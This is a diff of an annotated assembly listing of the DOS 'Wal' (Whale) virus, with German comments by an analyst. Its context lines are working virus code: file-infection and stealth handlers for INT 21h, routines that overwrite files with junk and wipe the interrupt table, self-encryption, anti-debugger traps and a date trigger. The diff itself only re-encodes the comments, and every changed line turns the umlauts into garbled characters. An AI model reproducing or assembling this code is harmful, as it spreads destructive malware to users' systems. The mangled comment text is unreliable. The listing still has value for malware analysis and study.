 J038F4:         IN      AL,40h
                 MOV     CS:[BX],AL      ; 16h Byte von CS:281A..2830
-                INC     BX              ; durch Zufallszahlen Åberschreiben
+                INC     BX              ; durch Zufallszahlen ÔøΩberschreiben
                 LOOP    J038F4
                 IN      AL,40h
                 MOV     BYTE PTR CS:[0001h],AL  ; dito den JMP bei CS:2811
@@ -2419,7 +2430,7 @@ J03919:         ;       JZ      J03916  ; => Nirwana !
                 NEG     BX              ; TASTATURPUFFER ( 40:1C) !
                 ADD     BX,CX           ; es testet den Tastaturpuffer
 ;********************************************************************
-                CMP     BX,BX           ;**** EINGEFöGT *************
+                CMP     BX,BX           ;**** EINGEFÔøΩGT *************
 ;********************************************************************
                 JNZ     J03936          ; dann direkt in die Dekode-Routine
                                         ; mit SI als Returnadresse
@@ -2436,7 +2447,7 @@ J03936: JMP     J02B87                  ; = push si, jmp decode
 ;---------------------------------------------------------------------
         DB      0e9h,06dh,0ah,0e9h,0a4h,0fch
 ;=====================================================================
-;========================================( Schreibt MÅll in Datei )===
+;========================================( Schreibt MÔøΩll in Datei )===
 ;=====================================================================
 Write_Trash_To_File:
                 MDECODE 61
@@ -2473,7 +2484,7 @@ J0397A:         MDECODE 62
                 PUSH    DS
                 POP     ES
                 MCODE   62
-                JMP     J039EC          ; ist die Datei ausfÅhrbar ?
+                JMP     J039EC          ; ist die Datei ausfÔøΩhrbar ?
 ;=====================================================================
 ;===========================================( Decode scharfmachen )===
 ;=====================================================================
@@ -2481,7 +2492,7 @@ J03990:         MOV     BYTE PTR CS:[SI+SwapCode_1],0E9h; JMP erzeugen
                 JMP     J03A1C
                 DB      0EAh
 ;=====================================================================
-;======================================( zerstîrt die INT-Tabelle )===
+;======================================( zerstÔøΩrt die INT-Tabelle )===
 ;=====================================================================
 Kill_Int_Table:
                 MDECODE 63
@@ -2503,7 +2514,7 @@ J039AF:         IN      AX,40h          ; Hole zufallszahl
                 MCODE   63
                 RETN
 ;=====================================================================
-;===================================( check auf ausfÅhrbare Datei )===
+;===================================( check auf ausfÔøΩhrbare Datei )===
 ;=====================================================================
 J039C3:         MDECODE 64
                 CALL    SaveRegisters
@@ -2547,7 +2558,7 @@ J03A0C:         JZ      J03A17
                 CMP     AL,0E2h              ; Also : IST ES EIN EXE ?
                 JNZ     J03A23               ; Weder COM noch EXE
 J03A17:         CALL    GetRegsFromVirstack  ; COM oder EXE
-                CLC                          ; Carry-Flag lîschen
+                CLC                          ; Carry-Flag lÔøΩschen
                 RETN
 ;=====================================================================
 ;====================================( JMP wird zeitweise erzeugt )===
@@ -2608,7 +2619,7 @@ J03A5A:         IN      AL,40h                  ; Zufallszahl holen
                                                 ;======================
                 MOV     SI,AX                   ; Quelle : 1274....1B5C
                                                 ; bzw.     3A84....436C
-                                                ; in StÅcken zu 4Ch !!!
+                                                ; in StÔøΩcken zu 4Ch !!!
                                                 ;======================
                 MOV     DI,Offset D4BB5-Offset VirStart
                 MOV     CX,M_SIZE               ; 4C Byte von CS:SI
@@ -2686,7 +2697,7 @@ J03ACD:         JMP_entry 3,mut_3
 MUT_5           EQU     $
 J03AD0:         MOV     CX,0BD7h                ; CX = 0bd7 ; = OFFSET 4BB5
 J03AD3:         XOR     WORD Ptr DS:[BX],4096h  ; also 11c3 mal, da BX um 3
-                                                ; erhîht wird
+                                                ; erhÔøΩht wird
                 ADD     BX,+03h
                 LOOP    J03AD3
                 MOV     AX,ES
@@ -3934,7 +3945,7 @@ J04267:         MOV     AL,[BX-01h]
                 XCHG    BX,SI
                 RETN
 
-J0427E          equ     $+3     ; SPRUNGZIEL FöR M#19, zeigt auf L0L0L0
+J0427E          equ     $+3     ; SPRUNGZIEL FÔøΩR M#19, zeigt auf L0L0L0
 J0427C:         PUSH    ES
                 XOR     AX,AX
                 POP     DS
@@ -4251,7 +4262,7 @@ J0448C:         CMP     Word PTR CS:[D2581],4   ; FILEHANDLE
                 POP     BX
                 SUB     BH,20h                  ; 2 Segmente vor CS
                 MOV     AX,CS:[D257B]           ; AX := SAVE-DS
-                CMP     AX,BX                   ; Ist SAVE-DS hîher
+                CMP     AX,BX                   ; Ist SAVE-DS hÔøΩher
                 JB      J044BA                  ; als D257B, z.B. das
                 MOV     CS:[D257B],BX           ; DS des COMMAND.COM
                 JMP     SHORT J044BA
@@ -4270,7 +4281,7 @@ SwitchByte      EQU     $
                 DB      0C6h    ; aus 0c6h wird 074h, Spiel mit Queue!
                 DB      0D2H    ; es sind genau 8 Byte dazwischen.....
         ;=============================================================
-        ; folgendermassen verÑndert :
+        ; folgendermassen verÔøΩndert :
         ;=============================================================
         ;        JZ      J0448C
         ;=============================================================
@@ -4299,7 +4310,7 @@ GetFileSize:    MDECODE 75
                 XOR     DX,DX
                 CALL    CS:[@INT21]
 
-                MOV     Word ptr CS:[FileSize+2],DX   ; File-Laenge zurÅck
+                MOV     Word ptr CS:[FileSize+2],DX   ; File-Laenge zurÔøΩck
                 MOV     Word ptr CS:[FileSize  ],AX
 
                 MOV     AX,4200h          ; SEEK zur alten Position
@@ -4318,7 +4329,7 @@ J0451A:         POP     AX      ; POP IP
                 POP     CX      ; POP Flags
                 JMP     J044A9
 ;=====================================================================
-;=================================( Handler fÅr Get/Set Filedatum )===
+;=================================( Handler fÔøΩr Get/Set Filedatum )===
 ;=====================================================================
 J0451F:         OR      AL,AL           ; GET File-Date ??
                 JNZ     J04550          ; Nein, SET !
@@ -4341,7 +4352,7 @@ J04550:         CMP     AL,01h          ; ist es 'set file date' ?
                 JNZ     J045CD          ; Fehler im Walcode!
                                         ; CALL LOW-INT-21
                 MDECODE 77
-                AND     WORD PTR CS:[D24B3],0FFFEH ; CF lîschen
+                AND     WORD PTR CS:[D24B3],0FFFEH ; CF lÔøΩschen
                 TEST    CH,80h          ; Stunde > 16 ?
                 MCODE   77
                 JZ      J0456B          ; nein
@@ -4358,7 +4369,7 @@ J04573:         MDECODE 78
                 MCODE   78
                 JMP     J02EA3                  ; fertig
 ;=====================================================================
-;=====================================( gehîrt zum INT 21-Handler )===
+;=====================================( gehÔøΩrt zum INT 21-Handler )===
 ;=====================================================================
 J0458D:         CALL    SaveRegs
                 IN      AL,21h
@@ -4378,7 +4389,7 @@ J0458D:         CALL    SaveRegs
 ;---------------------------------------------------------------------
                 DB      83h
 ;=====================================================================
-;=====================================( Handler fÅr SEEK / Handle )===
+;=====================================( Handler fÔøΩr SEEK / Handle )===
 ;=====================================================================
 J045B2:         MDECODE 79
 J045B7:         CMP     AL,02h          ; Seek File-ENDE ??
@@ -4396,17 +4407,17 @@ J045D0:         MDECODE 80
                 CALL    PushALL
                 MOV     AH,2Ah                  ; GET DATE
                 CALL    CS:[@INT21]
-                ;==========( Nur zwischen 18.Februar und 21. MÑrz )===
+                ;==========( Nur zwischen 18.Februar und 21. MÔøΩrz )===
                 CMP     DH,02h                  ; MONAT FEBRUAR ?
                 JZ      J045EC                  ; Ja : welcher
-                CMP     DH,03h                  ; MÑrz ?
+                CMP     DH,03h                  ; MÔøΩrz ?
                 JZ      J045F4                  ; Ja   : welcher
                 JMP     J04663                  ; Nein : fertig
 J045EC:         CMP     DL,13h                  ; Nach dem 18. Februar ??
                 JNB     J045FC                  ; JA   -> MSG
                 JMP     J04663                  ; NEIN -> fertig
 
-J045F4:         CMP     DL,15h                  ; VOR 21. MÑrz ??
+J045F4:         CMP     DL,15h                  ; VOR 21. MÔøΩrz ??
                 JB      J045FC                  ; JA   : MSG
                 JMP     J04663                  ; NEIN : Fertig
 J045FC:         JMP     J0463D
@@ -4434,10 +4445,10 @@ J04663:         CALL    PopALL
                 MCODE   80
                 RETN
 ;=====================================================================
-;=================================( Handler fÅr READ FILE /Handle )===
+;=================================( Handler fÔøΩr READ FILE /Handle )===
 ;=====================================================================
 J0466B:         JMP     J02B8B                  ; CALL LOW-INT-21
-J0466E:         AND     BYTE PTR CS:[D24B3],0FEh; CF lîschen
+J0466E:         AND     BYTE PTR CS:[D24B3],0FEh; CF lÔøΩschen
                 CALL    CheckFileTime
                 JZ      J0466B                  ; entweder kein DISK-File,
                                                 ; oder 'falsche' Uhrzeit
@@ -4453,13 +4464,13 @@ J0466E:         AND     BYTE PTR CS:[D24B3],0FEh; CF lîschen
                 SUB     AX,Word ptr CS:[FilePos  ]
                 SBB     DX,Word ptr CS:[FilePos+2]
                 MCODE   81
-                JNS     J046B9                  ; Lang genug fÅr den Wal
+                JNS     J046B9                  ; Lang genug fÔøΩr den Wal
                 MOV     WORD Ptr [BP-04h],0000h
                 JMP     J031E7                  ; fertig
 ;--------------------------------------------------------------------
 J046B9:         MDECODE 82
                 JNZ     J046C8                  ; JMP if Platz
-                CMP     AX,CX                   ; Mehr als Wal-LÑnge ?
+                CMP     AX,CX                   ; Mehr als Wal-LÔøΩnge ?
                 JA      J046C8
                 MOV     CS:[D24AF],AX           ; Dann eben mehr Byte lesen,
                                                 ; als verlangt !
@@ -4535,12 +4546,12 @@ J04767:         ADD     CS:[D24B1],AX
                 CALL    CS:[@INT21]
 
                 MCODE   84
-                JMP     J046DF                  ; zum nÑchsten TeilstÅck
+                JMP     J046DF                  ; zum nÔøΩchsten TeilstÔøΩck
 ;=====================================================================
-;=========================( Handler fÅr FindFirst/Findnext /ASCIIZ)===
+;=========================( Handler fÔøΩr FindFirst/Findnext /ASCIIZ)===
 ;=====================================================================
 J04780:         MDECODE 85
-                AND     WORD PTR CS:[D24B3],0FFFEH      ; ZF lîschen
+                AND     WORD PTR CS:[D24B3],0FFFEH      ; ZF lÔøΩschen
                 CALL    PopALL
                 CALL    CS:[@INT21]
                 CALL    PushALL
@@ -4567,7 +4578,7 @@ J047B1:         CLC
                 POP     ES
                 PUSH    DX
                 JMP     J047A0        ; DB 0EBH ; sind jetzt 2 Byte zuviel
-;-------------------------------------( 'echter code 'Åberlappend )---
+;-------------------------------------( 'echter code 'ÔøΩberlappend )---
 J047B7:         MDECODE 86
                 SUB     WORD Ptr DS:[BX+1Ah],Code_len
                 SBB     WORD Ptr DS:[BX+1Ch],+00h
@@ -4580,7 +4591,7 @@ J047B7:         MDECODE 86
 Wal_Ins_MEMTOP_Kopieren:
                 MDECODE 87
                 CALL    J03350                  ; selbsttest !
-                PUSH    CS      ; ursprÅnglich "PUSH    DS",
+                PUSH    CS      ; ursprÔøΩnglich "PUSH    DS",
                                 ; geht aber nicht
                 XOR     AX,AX
                 MOV     DS,AX
@@ -4600,9 +4611,9 @@ Wal_Ins_MEMTOP_Kopieren:
                 MOV     AX,WORD PTR DS:[0003h]  ; Hole Size des aktuellen MCB
                 SUB     AX,0270h                ; und ziehe 2700h Byte AB
                 ADD     DX,AX                   ; DX ist jetzt "MEM-TOP"
-                MOV     WORD PTR DS:[0003h],AX  ; MCB Ñndern
+                MOV     WORD PTR DS:[0003h],AX  ; MCB ÔøΩndern
                 POP     DI                      ; DI = 2947h
-                INC     DX                      ; 16 Byte hîher
+                INC     DX                      ; 16 Byte hÔøΩher
                 MOV     ES,DX                   ; ES ist ZielSegment
                 PUSH    CS
                 POP     DS
@@ -4642,7 +4653,7 @@ Trace_int_13h:  MDECODE 88
                 MOV     WORD PTR DS:[@Int_13h+2],ES
                 MOV     DL,02h
                 MOV     WORD PTR DS:[@Int_13h  ],BX
-                MOV     BYTE PTR DS:[D2450     ],DL ; DL=2, 2 Åbergehen
+                MOV     BYTE PTR DS:[D2450     ],DL ; DL=2, 2 ÔøΩbergehen
                 CALL    SetInt_01
 
                 MOV     WORD PTR DS:[D24DF  ],SP
@@ -4650,7 +4661,7 @@ Trace_int_13h:  MDECODE 88
 
                 PUSH    CS
                 MOV     AX,Offset J0488D-Offset VirStart
-                PUSH    AX              ; RETURNADRESSE fÅr RETF ist
+                PUSH    AX              ; RETURNADRESSE fÔøΩr RETF ist
                                         ; CS:J0207F, also CS:488D
                 MOV     AX,0070h
                 MOV     CX,0FFFFh       ; Bis zum letzten Byte suchen ...
@@ -4677,7 +4688,7 @@ Trace_int_13h:  MDECODE 88
                                                     ; JMP INT 13H
                 DB      0E9h
 ;=====================================================================
-;==========================================( RÅckkehr aus INT 13h )===
+;==========================================( RÔøΩckkehr aus INT 13h )===
 ;=====================================================================
 J0488D:         MDECODE 89
                 PUSH    CS
@@ -4730,7 +4741,7 @@ J048CD:         MDECODE 90
 ;=====================================================================
 J048F3:         MDECODE 91
                 ;----------------------( die Zahl 0401 bedeutet : )---
-                ;----------------------( 4 Ebenen, 1. Åbergehen   )---
+                ;----------------------( 4 Ebenen, 1. ÔøΩbergehen   )---
 
                 MOV     WORD PTR CS:[D2450],0401h
                 CALL    SetInt_01
@@ -4750,7 +4761,7 @@ J048F3:         MDECODE 91
 J0491A:         DB      00h    ; alias "210A" ! ; Klein, aber fein :-)
 ;=====================================================================
 ;==========================(         DIE DECODE-ROUTINE           )===
-;==========================( Dekodiert jedes Wal-HÑhrchen separat )===
+;==========================( Dekodiert jedes Wal-HÔøΩhrchen separat )===
 ;=====================================================================
 J0491B:         PUSHF
                 POP     CS:[D258E]
@@ -4767,7 +4778,7 @@ COMMENT #       ERGIBT ;
                 MOV     AX,CS:[BX]      ; GET WORD
                 ADD     BX,+02h         ; INC Returnadresse,2
                 PUSH    BX              ; auf den Stack damit
-                ;-----------------------; AL ist ZÑhler
+                ;-----------------------; AL ist ZÔøΩhler
                 MOV     CX,AX           ; AH ist XOR-byte
                 XOR     CH,CH
 J00120:         XOR     CS:[BX],AH
@@ -4792,7 +4803,7 @@ J04958:         IN      AL,40h          ; Hole Zufallszahl <> 0
                 POP     BX              ; Hole Adresse des Aufrufers
                 PUSH    BX
                 MOV     CX,Offset J02ACC-Offset J02AA8
-                SUB     BX,CX           ; 24h Byte zurÅckgehen
+                SUB     BX,CX           ; 24h Byte zurÔøΩckgehen
 J04965:         XOR     CS:[BX],AL
                 INC     BX
                 LOOP    J04965
@@ -4870,7 +4881,7 @@ Int_01_Entry:   PUSH    BP
                 MOV     BP,SP
                 PUSH    AX
                 CMP     WORD Ptr [BP+04h],0C000h  ; Callers Segment
-                JNB     J049ED                    ; hîher als C000h
+                JNB     J049ED                    ; hÔøΩher als C000h
                 MOV     AX,CS:[D2447]             ; oder tiefer
                 CMP     [BP+04h],AX               ; als D2447
                 JBE     J049ED
@@ -4904,12 +4915,12 @@ J04A1B:         DEC     BYTE PTR CS:[D2450+1]         ; Dec (Versuche)
 ;=====================================================================
 J04A2A:         DB      0fch,01eh,0e2h,0e4h,040h
 ;=====================================================================
-;========================( WIRD, Åber PATCH )=========================
+;========================( WIRD, ÔøΩber PATCH )=========================
 ;=====================================================================
                 ;CALL    J02CDA
                 ;IN      AL,40h
 ;=====================================================================
-;===============================================( XOR-Byte Ñndern )===
+;===============================================( XOR-Byte ÔøΩndern )===
 ;=====================================================================
                 MOV     CS:[XorByte__1],AL           ; D_4A5E
                 MOV     CS:[XorByte__2],AL           ; D_4A79
@@ -4930,7 +4941,7 @@ J04A42:         DB      0e8h,027h
 J04A44:         DB      01h             ; CALL    J04B6C
                 DB      0EAh,072h,0e1h  ; JB      J04A29
 ;=================================================================
-;===================( Wird Åber PATCH )===========================
+;===================( Wird ÔøΩber PATCH )===========================
 ;=================================================================
                 CALL    SetInt_AL       ; INT 01 auf INT 03 setzen
                 CALL    POPALL
@@ -4974,7 +4985,7 @@ J04A7F:         JMP     J0458D
                 DB      34h
 ;=====================================================================
 ;=======================(              INT 09-Handler             )===
-;=======================( Bei jedem (!) Tastendruck wird geprÅft, )===
+;=======================( Bei jedem (!) Tastendruck wird geprÔøΩft, )===
 ;=======================( ob ein Debugger am Werk ist !           )===
 ;=====================================================================
 J04A83:         MDECODE 92
@@ -5080,7 +5091,7 @@ J04B4D:
                 MOV     WORD PTR ES:[000Ah],0000h ; ist FFFF:0000 !?!
                 CALL    PopALL
                 CALL    SaveRegs
-                ;---------------------------------( Wal zerstîren )---
+                ;---------------------------------( Wal zerstÔøΩren )---
                 MOV     CX,IfDebugWal   ; 1185h   ; 230Ah Byte
                 MOV     BX,StartDebug   ; 004Fh   ; ab 4Fh / 285Fh
                 MOV     AX,0802h        ; mit 0802h verORen
@@ -5102,7 +5113,7 @@ D4B7C:          DB      0E8h
 Schwimme_Fort:  OR      BYTE PTR CS:[BX],15h ; CX = 236Ch
                 INC     BX                   ; BX = 0
                 LOOP    Schwimme_Fort        ; also von 2810 bis D4B7C
-                                             ; alles lîschen
+                                             ; alles lÔøΩschen
                 RETF                         ; RETF nach
                                              ; Oberen-Speicher:01B1
                                              ; Identisch mit CS:29C1
@@ -5122,7 +5133,7 @@ L0L0L0:         RETN
 D4BAC           DB      00h          ; Signal-Byte zur Erkennung,
                                      ; ob Wal dekodiert ist oder nicht
 ;=====================================================================
-;=============================================( VerschlÅsselt WAL )===
+;=============================================( VerschlÔøΩsselt WAL )===
 ;=====================================================================
 Code_Whale:     PUSH    CX
                 PUSH    BX
@@ -5152,7 +5163,7 @@ J04BB9:         MOV     DL,[BX    ]
 Decode_Whale:   CALL    J04BD1
 J04BCF:         XOR     BX,SI           ; DUMMY !
 J04BD1:         XOR     SI,1876h        ; SI = 1876, kann immer
-                                        ; geÑndert werden
+                                        ; geÔøΩndert werden
                 POP     BX              ; BX = 4BCF
                 POP     SI
                 SUB     BX,Code_start   ; BX = 2830
